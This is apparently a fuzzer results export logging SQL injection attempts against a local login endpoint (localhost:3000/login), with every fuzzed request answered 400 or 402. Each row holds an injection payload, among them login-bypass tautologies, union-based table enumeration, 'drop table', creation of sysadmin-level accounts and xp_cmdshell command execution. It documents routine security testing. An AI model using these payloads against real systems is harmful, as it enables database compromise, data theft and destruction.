Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,200,OK,346,378,73,596,269,,,[]
5,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,7,378,82,609,76,,,"[exec sp_addlogin 'name' , 'password']"
11,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,12,378,71,609,76,,,[1 and user_name() = 'dbo']
1,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,14,378,92,609,76,,,['; exec master..xp_cmdshell 'ping 10.10.1.2'--]
12,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,400,Bad Request,17,378,64,366,88,,,[\'; desc users; --]
3,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,19,379,137,609,76,,,[create user name identified by pass123 temporary tablespace temp default tablespace users; ]
9,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,21,379,234,609,76,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)]"
14,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,23,378,76,609,76,,,[1' and non_existant_table = '1]
6,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,25,378,90,609,76,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin']"
8,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,27,378,92,609,76,,,[grant connect to name; grant resource to name;]
13,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,400,Bad Request,29,378,50,366,88,,,[1\'1]
15,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,35,378,87,609,76,,,[' or username is not NULL or username = ']
2,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,41,378,86,609,76,,,[create user name identified by 'pass123']
10,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,44,378,47,609,76,,,[1]
4,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,48,378,68,609,76,,,[' ; drop table temp --]
7,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,51,379,141,609,76,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))]"
16,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,50,379,140,609,76,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116]"
18,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,52,378,79,609,76,,,[1 uni/**/on select all from where]
17,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,58,379,118,609,76,,,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --]"
20,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,58,378,49,609,76,,,[a' ]
22,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,63,378,59,609,76,,,[a' or 1=1; --]
23,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,68,378,47,609,76,,,[@]
21,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,71,378,51,609,76,,,[a' --]
19,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,73,378,47,609,76,,Reflected,[a]
24,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,75,378,47,609,76,,,[?]
25,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,80,378,66,609,76,,,[' and 1=0) union all]
26,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,82,378,57,609,76,,,[? or 1=1 --]
27,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,84,378,71,609,76,,,[x' and userid is NULL; --]
28,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,87,378,70,609,76,,,[x' and email is NULL; --]
30,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,96,378,89,609,76,,,[x' and 1=(select count(*) from tabname); --]
29,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,98,378,65,609,76,,,[anything' or 'x'='x]
31,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,106,378,78,609,76,,,[x' and members.email is NULL; --]
32,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,106,378,73,609,76,,,[x' or full_name like '%bob%]
33,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,105,378,59,609,76,,,[23 or 1=1; --]
34,Fuzzed,Sun Oct 06 22:54:27 IST 2024,POST,http://localhost:3000/login,402,Payment Required,105,378,95,609,76,,,['; exec master..xp_cmdshell 'ping 172.10.1.255'--]
